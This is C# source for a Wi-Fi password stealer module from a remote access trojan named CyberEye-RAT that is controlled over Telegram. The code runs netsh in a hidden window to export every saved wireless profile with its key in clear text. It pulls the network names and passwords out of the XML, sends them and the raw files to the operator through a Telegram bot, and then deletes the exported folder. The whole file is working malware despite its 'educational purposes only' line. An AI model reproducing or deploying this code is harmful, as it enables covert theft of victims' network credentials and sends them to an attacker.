/*
       ^ Author    : Cisamu
       ^ Name      : CyberEye-RAT
       ^ Github    : https://github.com/cisamu123
       > This program is distributed for educational purposes only.
*/

using System;
using System.Diagnostics;
using System.IO;
using System.Xml;

namespace TelegramRAT.modded
{
    internal sealed class Wifi_Steal
    {
        public static string[] fileNames;
        public static int count = 1;

        public static void Steal(string folderPath)
        {
            folderPath = utils.Base64Decode(folderPath);
            if (!System.IO.Directory.Exists(folderPath))
            {
                System.IO.Directory.CreateDirectory(folderPath);
            }

            Process process = new Process();

            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = "netsh";
            startInfo.Arguments = $"wlan export profile key=clear folder=\"{folderPath}\"";
            startInfo.RedirectStandardOutput = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            process.StartInfo = startInfo;

            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();

            fileNames = Directory.GetFiles(folderPath);

            foreach (string fileName in fileNames)
            {
                telegram.sendFile(fileName);
                string name = string.Empty;
                string keyMaterial = string.Empty;

                GetNameAndKeyMaterialFromFile(fileName, out name, out keyMaterial);
                string message = $"ℹ️ File {count}:  WiFi Name: {name}, WiFi Password: {keyMaterial}";

                telegram.sendText(message);

                count++;
            }
            Directory.Delete(folderPath, true);
        }

        public static void GetNameAndKeyMaterialFromFile(string filePath, out string name, out string keyMaterial)
        {
            name = string.Empty;
            keyMaterial = string.Empty;

            try
            {
                XmlDocument xmlDoc = new XmlDocument();
                xmlDoc.Load(filePath);

                XmlNamespaceManager nsManager = new XmlNamespaceManager(xmlDoc.NameTable);
                nsManager.AddNamespace("ns", "http://www.microsoft.com/networking/WLAN/profile/v1");

                XmlNode nameNode = xmlDoc.SelectSingleNode("/ns:WLANProfile/ns:SSIDConfig/ns:SSID/ns:name", nsManager);
                XmlNode keyMaterialNode = xmlDoc.SelectSingleNode("/ns:WLANProfile/ns:MSM/ns:security/ns:sharedKey/ns:keyMaterial", nsManager);

                if (nameNode != null)
                {
                    name = nameNode.InnerText;
                }
                else
                {
                    telegram.sendText("❌ WiFi Name node not found.");
                }

                if (keyMaterialNode != null)
                {
                    keyMaterial = keyMaterialNode.InnerText;
                }
                else
                {
                    telegram.sendText("❌ WiFi KeyMaterial (Password) node not found.");
                }
            }
            catch (Exception ex)
            {
                telegram.sendText($"❌ Error while retrieving name and keyMaterial: {ex}");
            }
        }
    }
}
